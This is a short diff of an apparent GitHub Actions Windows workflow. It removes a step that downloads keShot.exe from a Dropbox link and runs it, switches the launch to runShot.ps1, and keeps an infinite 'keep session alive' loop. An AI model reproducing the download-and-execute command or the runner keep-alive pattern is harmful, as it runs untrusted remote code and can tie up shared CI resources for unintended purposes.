@@ -6,19 +6,14 @@ on:
 jobs:
   run-windows:
     runs-on: windows-latest
-    timeout-minutes: 30
+    timeout-minutes: 15
 
     steps:
-      - name: Downloading & Installing Essentials
-        run: |
-          Invoke-WebRequest -Uri "https://www.dropbox.com/scl/fi/rud4p7whifvqjncwtteea/keShot.exe?rlkey=k38ehbypdhtbgvn29hwepaq67&st=p9ci398c&raw=1" -OutFile "keShot.exe"
-          cmd /c keShot.exe
-
       - name: Run programs and keep session alive
         shell: powershell
         run: |
           Write-Host "Launching programs..."
-          Start-Process ".\keShot.exe" -PassThru
+          Start-Process ".\runShot.ps1" -PassThru
       
           Write-Host "Keep Alive Loop started..."
           while ($true) {
